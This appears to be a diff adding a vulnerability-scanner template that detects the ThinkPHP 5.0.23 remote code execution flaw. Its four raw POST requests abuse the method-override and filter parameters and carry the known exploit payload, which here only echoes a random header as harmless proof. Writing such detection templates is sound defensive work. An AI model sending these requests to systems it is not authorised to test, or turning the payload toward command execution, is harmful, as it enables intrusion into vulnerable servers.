@@ -1,0 +1,67 @@
+id: thinkphp-5-0-23-index-php-method-rce
+info:
+  name: ThinkPHP 5.0.23 index.php Method RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Remote Code Execution vulnerability in ThinkPHP 5.0.23 allowing attackers to execute arbitrary code via crafted requests.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+    - https://y4er.com/posts/thinkphp5-rce/
+
+variables:
+  rHeader: "{{rand_text_alpha(8)}}"
+  r1: "{{rand_text_alpha(10)}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=GET&server[REQUEST_METHOD]={{rHeader}}:{{r1}}
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "{{rHeader}}: {{r1}}"
+
+  - raw:
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=get&get[]={{rHeader}}:{{r1}}
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "{{rHeader}}: {{r1}}"
+
+  - raw:
+      - |
+        POST /index.php?s=index/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s={{rHeader}}:{{r1}}&_method=__construct&method=&filter[]=header
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "{{rHeader}}: {{r1}}"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&server[REQUEST_METHOD]={{rHeader}}:{{r1}}
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "{{rHeader}}: {{r1}}"
